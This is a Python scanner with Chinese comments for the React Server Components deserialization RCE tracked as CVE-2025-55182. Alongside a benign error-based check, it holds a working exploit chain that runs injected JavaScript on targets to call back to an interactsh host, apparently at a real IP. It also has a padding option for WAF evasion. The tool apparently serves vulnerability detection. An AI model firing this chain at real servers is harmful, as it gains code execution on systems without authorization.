#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
react2shell-detector (Python 单文件版)

CVE-2025-55182 ("React2Shell") —— React Server Components Flight 协议反序列化
未授权 RCE (CVSS 10.0) 的双层高保真探测：

第一层 (safe 旁路，默认)：
  发送带引用 `["$1:a:a"]` 的 multipart Flight 请求。未修复的 React 在解析
  `:` 引用链时不检查键是否存在：`{}.a.a` → `(undefined).a` 直接抛 TypeError
  → HTTP 500，响应 flight 错误行里带 `E{"digest"`；补丁版本 (19.0.1/19.1.2/
  19.2.1+) 对不存在的键直接跳过，不再 500。此步不在目标上执行任何代码。

第二层 (--oob 确认，可选)：
  对第一层命中的目标发送完整反序列化利用链 (__proto__ 遍历取 Chunk.prototype.then
  → 伪造 resolved_model chunk → $B blob 引用 + Function 构造器造函数)，但"代码"
  只是一行 Node http.get 回连 interactsh —— 不执行命令、不落文件。收到 OOB 回连
  判定 CONFIRMED。

影响面：
  react-server-dom-{webpack,turbopack,parcel} 19.0.0, 19.1.0–19.1.1, 19.2.0。
  典型暴露面：未修复的 Next.js App Router server actions
  (< 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7) 及自建 RSC。
  漏洞在反序列化阶段触发、早于 action 校验，任意 Next-Action 头值即可。
修复版本：
  react 19.0.1 / 19.1.2 / 19.2.1 (2025-12-03)。
  CVE-2025-66478 已被 REJECTED，视为本 CVE 的重复。

依赖：
  pip install requests cryptography
  (仅 HTTP/HTTPS 代理；不支持 socks5)

用法示例：
  python3 poc.py scan -t https://target.example.com/
  python3 poc.py scan -f targets.txt --path / --path /en -v
  python3 poc.py scan -t https://target.example.com/ --oob http://111.124.203.18:50050
  python3 poc.py verify --oob http://111.124.203.18:50050
"""

import argparse
import base64
import json
import os
import re
import secrets
import sys
import time
from urllib.parse import urljoin, urlparse

import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

# 目标可能是自签名/过期证书的主机，忽略 TLS 校验；关闭对应告警。
requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

VERSION = "1.0.0"


# --------------------------------------------------------------------------- #
# 彩色输出：非 TTY 或设置了 NO_COLOR 时自动关闭
# --------------------------------------------------------------------------- #
def _enable_windows_ansi() -> None:
    if os.name == "nt":
        try:
            import ctypes

            kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


_enable_windows_ansi()
USE_COLOR = (os.environ.get("NO_COLOR", "") == "") and sys.stdout.isatty()


def _colorize(code: str, s: str) -> str:
    if not USE_COLOR:
        return s
    return "\x1b[" + code + "m" + s + "\x1b[0m"


def red(s: str) -> str:
    return _colorize("31", s)


def green(s: str) -> str:
    return _colorize("32;1", s)


def yellow(s: str) -> str:
    return _colorize("33", s)


def cyan(s: str) -> str:
    return _colorize("36", s)


# --------------------------------------------------------------------------- #
# 时间间隔解析：把 "8s"/"25s"/"500ms"/"1m30s" 之类解析为秒
# --------------------------------------------------------------------------- #
_DUR_UNITS = {"ns": 1e-9, "us": 1e-6, "µs": 1e-6, "ms": 1e-3, "s": 1.0, "m": 60.0, "h": 3600.0}
_DUR_RE = re.compile(r"(\d+(?:\.\d+)?)(ns|us|µs|ms|s|m|h)")


def parse_duration(text: str) -> float:
    s = text.strip()
    if s == "" or s == "0":
        return 0.0
    matches = _DUR_RE.findall(s)
    if matches and "".join(a + b for a, b in matches) == s:
        return sum(float(val) * _DUR_UNITS[unit] for val, unit in matches)
    try:  # 允许纯数字，按秒处理
        return float(s)
    except ValueError:
        raise argparse.ArgumentTypeError(f"invalid duration: {text!r}")


_ALNUM = "abcdefghijklmnopqrstuvwxyz0123456789"


def rand_alnum(n: int) -> str:
    return "".join(secrets.choice(_ALNUM) for _ in range(n))


CORRELATION_ID_LEN = 20
NONCE_LEN = 13


# --------------------------------------------------------------------------- #
# interactsh 客户端：注册、轮询、解密 HTTP 交互
# --------------------------------------------------------------------------- #
class InteractshError(Exception):
    pass


class InteractshClient:
    """精简版 interactsh 客户端。服务器以 -scan-everywhere 跑在裸 IP 上 (无域名)，
    按请求路径里的 33 位 token (correlationID+nonce) 关联回连。"""

    def __init__(self, oob_url: str, timeout: float):
        u = urlparse(oob_url)
        if not u.scheme or not u.netloc:
            raise InteractshError(f"invalid oob url {oob_url!r}")
        self.base = f"{u.scheme}://{u.netloc}"
        self.corr_id = rand_alnum(CORRELATION_ID_LEN)
        self.secret = rand_alnum(32)
        self.priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        self.timeout = timeout
        self.session = requests.Session()  # 与目标流量分开，不走代理

    def new_name(self) -> str:
        """返回 `<correlationID><fresh-nonce>` —— 33 字符 token，嵌入 payload 路径。"""
        return self.corr_id + rand_alnum(NONCE_LEN)

    def _encode_public_key(self) -> str:
        der = self.priv.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
        b64 = base64.b64encode(der).decode("ascii")
        lines = [b64[i : i + 64] for i in range(0, len(b64), 64)]
        pem = "-----BEGIN RSA PUBLIC KEY-----\n" + "\n".join(lines) + "\n-----END RSA PUBLIC KEY-----\n"
        return base64.b64encode(pem.encode("ascii")).decode("ascii")

    def register(self) -> None:
        body = {
            "public-key": self._encode_public_key(),
            "secret-key": self.secret,
            "correlation-id": self.corr_id,
        }
        resp = self.session.post(
            self.base + "/register", json=body, timeout=self.timeout,
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code != 200:
            raise InteractshError(f"register failed: {resp.status_code}: {resp.text.strip()}")
        try:
            msg = resp.json().get("message")
        except ValueError:
            msg = None
        if msg != "registration successful":
            raise InteractshError(f"unexpected register response: {resp.text.strip()}")

    def poll(self):
        url = f"{self.base}/poll?id={self.corr_id}&secret={self.secret}"
        resp = self.session.get(url, timeout=self.timeout)
        if resp.status_code != 200:
            raise InteractshError(f"poll failed: {resp.status_code}: {resp.text.strip()}")
        try:
            pr = resp.json()
        except ValueError as e:
            raise InteractshError(f"decode poll response: {e}")

        out = []
        aes_key = pr.get("aes_key") or ""
        for d in pr.get("data") or []:
            try:
                plain = self._decrypt(aes_key, d)
            except Exception:
                continue
            try:
                it = json.loads(plain.strip())
            except (ValueError, UnicodeDecodeError):
                continue
            if isinstance(it, dict):
                out.append(it)
        for s in (pr.get("extra") or []) + (pr.get("tlddata") or []):
            if not s:
                continue
            try:
                it = json.loads(s)
            except (ValueError, TypeError):
                continue
            if isinstance(it, dict):
                out.append(it)
        return out

    def deregister(self) -> None:
        body = {"correlation-id": self.corr_id, "secret-key": self.secret}
        try:
            self.session.post(
                self.base + "/deregister", json=body, timeout=self.timeout,
                headers={"Content-Type": "application/json"},
            )
        except requests.RequestException:
            pass

    def _decrypt(self, aes_key_b64: str, msg_b64: str) -> bytes:
        # AES-256-CTR-over-RSA-OAEP(SHA256)：RSA-OAEP 解出 AES key，
        # 再 AES-CTR (IV = 首个 block) 解密。
        wrapped = base64.b64decode(aes_key_b64)
        key = self.priv.decrypt(
            wrapped,
            padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
        )
        ct = base64.b64decode(msg_b64)
        if len(ct) < 16:
            raise ValueError("ciphertext too short")
        iv, data = ct[:16], ct[16:]
        cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
        dec = cipher.decryptor()
        return dec.update(data) + dec.finalize()


# --------------------------------------------------------------------------- #
# Flight 协议 payload 构造
# --------------------------------------------------------------------------- #
BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
ROUTER_STATE_TREE = (
    "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D"
    "%2Cnull%2Cnull%2Ctrue%5D"
)


def base_headers() -> dict:
    """触发 RSC action 反序列化所需的最小头集合。Next-Action 值任意 —— 反序列化
    发生在 action 校验之前 (getActionModIdOrError)，伪造值即可。"""
    return {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 react-vuln/" + VERSION
        ),
        "Next-Action": "x",
        "Next-Router-State-Tree": ROUTER_STATE_TREE,
        "X-Nextjs-Request-Id": rand_alnum(8),
        "X-Nextjs-Html-Request-Id": rand_alnum(21),
    }


def _multipart_part(name: str, value: str) -> str:
    return (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
        f"{value}\r\n"
    )


def build_multipart(fields, junk_kb: int = 0):
    """fields: [(name, value), ...] → (body_bytes, content_type)。
    junk_kb > 0 时在 body 最前面塞一个随机大字段，绕过只检查 body 头部的 WAF。"""
    parts = []
    if junk_kb > 0:
        parts.append(_multipart_part(rand_alnum(12), rand_alnum(junk_kb * 1024)))
    for name, value in fields:
        parts.append(_multipart_part(name, value))
    body = "".join(parts) + "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    return body.encode("utf-8"), f"multipart/form-data; boundary={BOUNDARY}"


def build_safe_fields():
    """第一层 safe 旁路 payload：chunk1={}，chunk0=["$1:a:a"]。
    未修复 React：{}.a.a → (undefined).a → TypeError → 500 + E{"digest"}。
    修复后：不存在的键被跳过，无异常。"""
    return [("1", "{}"), ("0", '["$1:a:a"]')]


def build_oob_fields(oob_url: str):
    """第二层 OOB 确认 payload (maple3142 链)：
      chunk0: then → 自身原型上的 Chunk.prototype.then；status=resolved_model 使
              initializeModelChunk 二次解析 value；_response 伪造 response，令
              $B blob 引用执行 _formData.get(_prefix + "1337")，其中
              _formData.get = $1:constructor:constructor = Function 构造器；
      chunk1: "$@0" 返回 chunk0 的原始对象 (而非解析值)，供原型遍历使用；
      chunk2: [] 供 $Q 引用占位。
    "执行"的代码只是一行 http.get 回连 OOB —— 不执行命令、不落文件。"""
    js = (
        "try{"
        "var r=null;"
        "if(process.mainModule&&process.mainModule.require){r=process.mainModule.require}"
        "else if(typeof process.getBuiltinModule==='function'){r=process.getBuiltinModule}"
        "if(r){var h=r('http');var q=h.get('" + oob_url + "');q.on('error',function(){})}"
        "}catch(e){};"  # 末尾 ";"：$B 引用会再拼 "1337"，需落成无害表达式
    )
    chunk0 = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": js,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }
    return [
        ("0", json.dumps(chunk0, separators=(",", ":"))),
        ("1", '"$@0"'),
        ("2", "[]"),
    ]


# --------------------------------------------------------------------------- #
# 小工具
# --------------------------------------------------------------------------- #
def clip(s: str, n: int) -> str:
    if len(s) <= n:
        return s
    return s[:n] + "…"


def first_line(s: str) -> str:
    for i, ch in enumerate(s):
        if ch in "\r\n":
            return s[:i]
    return s


def load_targets(single, file):
    out = list(single or [])
    if file:
        with open(file, "r", encoding="utf-8") as f:
            for ln in f.read().split("\n"):
                ln = ln.strip()
                if ln and not ln.startswith("#"):
                    out.append(ln)
    return out


def normalize_target(t: str) -> str:
    t = t.strip()
    if not t.startswith(("http://", "https://")):
        t = "https://" + t
    return t.rstrip("/")


def parse_headers(items):
    headers = {}
    for raw in items or []:
        name, sep, value = raw.partition(":")
        name = name.strip()
        if not sep or not name:
            raise ValueError(f"invalid header (want 'Name: Value'): {raw!r}")
        headers[name] = value.lstrip()
    return headers


def parse_proxy(s: str):
    if "://" not in s:
        s = "http://" + s
    u = urlparse(s)
    if not u.hostname:
        raise ValueError(f"proxy has no host: {s!r}")
    return f"{u.scheme}://{u.netloc}"


# --------------------------------------------------------------------------- #
# 请求发送与旁路判定
# --------------------------------------------------------------------------- #
def post_payload(session, url, body, content_type, extra_headers, timeout, proxies,
                 verbose, tag, max_redirects=3):
    """POST payload；跟随同 host 重定向 (如 / → /en/) 重试，跨 host 不跟。
    返回 (response|None, final_url, error|None)。"""
    headers = base_headers()
    headers["Content-Type"] = content_type
    headers.update(extra_headers or {})
    current = url
    origin_host = urlparse(url).netloc
    seen = set()
    resp = None
    for _ in range(max_redirects + 1):
        if current in seen:
            break
        seen.add(current)
        try:
            resp = session.post(
                current, data=body, headers=headers, timeout=timeout,
                proxies=proxies, verify=False, allow_redirects=False,
            )
        except requests.RequestException as e:
            return None, current, str(e)
        if verbose:
            print(f"{cyan('[>]',)} {tag} POST {current} → {resp.status_code}")
            print(f"    body: {clip(resp.text.replace(chr(10), ' '), 240)}")
        if resp.status_code in (301, 302, 303, 307, 308):
            loc = resp.headers.get("Location", "")
            if not loc:
                return resp, current, None
            nxt = urljoin(current, loc)
            if urlparse(nxt).netloc != origin_host:
                return resp, current, None
            current = nxt
            continue
        return resp, current, None
    return resp, current, None


def judge_safe(resp) -> str:
    """safe 旁路判定：500 + flight 错误行 E{"digest"} = 命中；
    Vercel/Netlify 平台级缓解 (Server 头 / Netlify-Vary) 单独归类，不算发现。"""
    if resp.status_code == 500 and 'E{"digest"' in resp.text:
        server = resp.headers.get("Server", "").lower()
        if "vercel" in server or "netlify" in server or "Netlify-Vary" in resp.headers:
            return "mitigated"
        return "hit"
    return "miss"


# --------------------------------------------------------------------------- #
# 扫描主流程
# --------------------------------------------------------------------------- #
def run_scan(cfg) -> int:
    targets = [normalize_target(t) for t in load_targets(cfg["target"], cfg["file"])]
    if not targets:
        print(f"{red('error:')} no targets (use -t URL or -f FILE)")
        return 2
    paths = [p if p.startswith("/") else "/" + p for p in (cfg["path"] or ["/"])]

    proxies = None
    if cfg["proxy"]:
        proxies_norm = parse_proxy(cfg["proxy"])
        proxies = {"http": proxies_norm, "https": proxies_norm}
        print(f"{cyan('[*]')} target traffic via proxy {proxies_norm}")
    session = requests.Session()

    oob = InteractshClient(cfg["oob"], cfg["timeout"]) if cfg["oob"] else None
    if oob:
        oob.register()
        print(f"{cyan('[*]')} registered with {oob.base} (correlationID={oob.corr_id})")

    results = []  # (target, verdict, detail)
    oob_tasks = {}  # name -> (target, tested_url)
    try:
        for tgt in targets:
            verdict, detail = "miss", ""
            tested = tgt
            hit_resp = None
            for path in paths:
                url = tgt + ("" if path == "/" else path)
                body, ctype = build_multipart(build_safe_fields(), cfg["junk"])
                resp, final_url, err = post_payload(
                    session, url, body, ctype, cfg["headers"],
                    cfg["timeout"], proxies, cfg["verbose"], "safe",
                )
                if err:
                    detail = err
                    continue
                judged = judge_safe(resp)
                tested = final_url
                if judged == "hit":
                    verdict, hit_resp = "hit", resp
                    break
                if judged == "mitigated" and verdict != "hit":
                    verdict, detail = "mitigated", f"status={resp.status_code}"
                elif verdict == "miss":
                    detail = f"status={resp.status_code}"
            if verdict == "hit" and hit_resp is not None:
                detail = (
                    f"status={hit_resp.status_code} "
                    f"content-type={hit_resp.headers.get('Content-Type', '?')}"
                )
            results.append([tgt, verdict, detail, tested])
            if verdict == "hit":
                if oob:
                    print(f"{yellow('[!] SAFE-HIT')} {tgt} ({detail}) → sending OOB confirm...")
                else:
                    print(f"{yellow('[+] LIKELY VULNERABLE')} {tgt} ({detail})")
            elif verdict == "mitigated":
                print(f"{cyan('[i] mitigated')} {tgt} (platform WAF: {detail})")

        # 第二层：仅对 safe 命中的目标发 OOB 确认探针。
        if oob and any(r[1] == "hit" for r in results):
            for r in results:
                tgt, verdict, _, tested = r
                if verdict != "hit":
                    continue
                name = oob.new_name()
                oob_url = f"{oob.base}/{name}"
                body, ctype = build_multipart(build_oob_fields(oob_url), cfg["junk"])
                oob_tasks[name] = (tgt, tested)
                if cfg["verbose"]:
                    print(f"{cyan('[>]')} oob probe {tgt} → {oob_url}")
                resp, _, err = post_payload(
                    session, tested, body, ctype, cfg["headers"],
                    cfg["timeout"], proxies, cfg["verbose"], "oob",
                )
                if err and cfg["verbose"]:
                    print(f"{yellow('[!]')} oob send {tgt}: {err}")

            print(
                f"{cyan('[*]')} sent {len(oob_tasks)} OOB probe(s); polling "
                f"{_fmt_dur(cfg['wait'])} for callbacks..."
            )
            confirmed = {}
            deadline = time.monotonic() + cfg["wait"]
            while True:
                try:
                    its = oob.poll()
                except InteractshError as e:
                    its = []
                    if cfg["verbose"]:
                        print(f"{yellow('[!]')} poll: {e}")
                for it in its:
                    uid = str(it.get("unique-id", "")).lower()
                    task = oob_tasks.get(uid)
                    if task is None or uid in confirmed:
                        continue
                    confirmed[uid] = True
                    tgt, tested = task
                    print(f"\n{green('[+] VULNERABLE (confirmed OOB)')} {tgt}")
                    print(f"    via {it.get('protocol')} callback from {it.get('remote-address')}")
                    line = first_line(it.get("raw-request", "") or "")
                    if line:
                        print(f"    request: {line}")
                    for r in results:
                        if r[0] == tgt:
                            r[1] = "confirmed"
                if time.monotonic() > deadline:
                    break
                time.sleep(cfg["interval"])

        # 汇总。
        n_vuln = sum(1 for r in results if r[1] in ("confirmed", "hit"))
        print(f"\n{cyan('[*]')} done: {n_vuln}/{len(results)} target(s) vulnerable")
        for tgt, verdict, detail, tested in results:
            if verdict == "confirmed":
                print(f"    {green('VULNERABLE (confirmed OOB)')}  {tgt}")
            elif verdict == "hit":
                note = "(safe side-channel; confirm with --oob)" if oob else "(safe side-channel)"
                print(f"    {yellow('LIKELY VULNERABLE')}  {tgt}  {note}")
            elif verdict == "mitigated":
                print(f"    {cyan('mitigated')}  {tgt}  ({detail})")
            else:
                suffix = f"  ({detail})" if detail and detail.startswith("status=") else ""
                print(f"    not vulnerable  {tgt}{suffix}")
        return 1 if n_vuln else 0
    finally:
        if oob:
            oob.deregister()


def verify_oob(oob_url: str, timeout: float, wait: float, interval: float):
    """自检 OOB 服务器：注册 → 自己发一次目标会发的 GET → 轮询关联匹配。"""
    c = InteractshClient(oob_url, timeout)
    c.register()
    print(f"{cyan('[*]')} registered with {c.base} (correlationID={c.corr_id})")
    name = c.new_name()
    try:
        c.session.get(c.base + "/" + name, timeout=timeout)
    except requests.RequestException as e:
        raise InteractshError(f"simulated callback GET: {e}")
    deadline = time.monotonic() + wait
    try:
        while True:
            try:
                its = c.poll()
            except InteractshError:
                its = []
            for it in its:
                if str(it.get("unique-id", "")).lower() == name.lower():
                    print(f"{green('[+] OK: OOB server works end-to-end')}")
                    return
            if time.monotonic() > deadline:
                raise InteractshError(f"no matching interaction within {_fmt_dur(wait)}")
            time.sleep(interval)
    finally:
        c.deregister()


def _fmt_dur(seconds: float) -> str:
    if seconds == int(seconds):
        return f"{int(seconds)}s"
    return f"{seconds}s"


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def main() -> int:
    ap = argparse.ArgumentParser(
        prog="react2shell-detector",
        description="CVE-2025-55182 (React2Shell) 双层高保真探测：safe 错误旁路 + 可选 OOB 确认",
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    sp = sub.add_parser("scan", help="扫描目标 (默认仅 safe 旁路，不执行任何代码)")
    sp.add_argument("-t", "--target", action="append", help="目标完整 URL，可重复")
    sp.add_argument("-f", "--file", help="目标列表文件，每行一个 URL")
    sp.add_argument("--path", action="append", help="探测路径，可重复 (默认 /)")
    sp.add_argument("-H", "--header", action="append", help="附加请求头 'Name: Value'，可重复")
    sp.add_argument("-x", "--proxy", help="目标流量走 http/https 代理 (如 127.0.0.1:8080)")
    sp.add_argument("--oob", default=os.environ.get("OOB_URL", ""),
                    help="interactsh OOB 服务器 (启用第二层确认；默认只跑 safe 旁路)")
    sp.add_argument("--junk", type=int, default=0, metavar="KB",
                    help="body 前置随机垃圾字段大小 (KB)，绕过只查 body 头部的 WAF")
    sp.add_argument("--timeout", type=float, default=10.0, help="单请求超时秒数 (默认 10)")
    sp.add_argument("--wait", type=parse_duration, default=10.0, help="OOB 回连轮询窗口 (默认 10s)")
    sp.add_argument("--interval", type=parse_duration, default=2.0, help="OOB 轮询间隔 (默认 2s)")
    sp.add_argument("-v", "--verbose", action="store_true", help="打印请求/响应细节")

    vp = sub.add_parser("verify", help="自检 OOB 服务器端到端可用")
    vp.add_argument("--oob", default=os.environ.get("OOB_URL", ""), help="interactsh OOB 服务器")
    vp.add_argument("--timeout", type=float, default=10.0)
    vp.add_argument("--wait", type=parse_duration, default=10.0)
    vp.add_argument("--interval", type=parse_duration, default=2.0)

    cfg = vars(ap.parse_args())
    try:
        if cfg["cmd"] == "scan":
            cfg["headers"] = parse_headers(cfg.get("header"))
        if cfg["cmd"] == "verify":
            if not cfg["oob"]:
                print(f"{red('error:')} verify needs --oob (or env OOB_URL)")
                return 2
            verify_oob(cfg["oob"], cfg["timeout"], cfg["wait"], cfg["interval"])
            return 0
        return run_scan(cfg)
    except InteractshError as e:
        print(f"{red('error:')} oob: {e}")
        return 2
    except ValueError as e:
        print(f"{red('error:')} {e}")
        return 2
    except KeyboardInterrupt:
        print(f"\n{yellow('interrupted')}")
        return 130


if __name__ == "__main__":
    sys.exit(main())
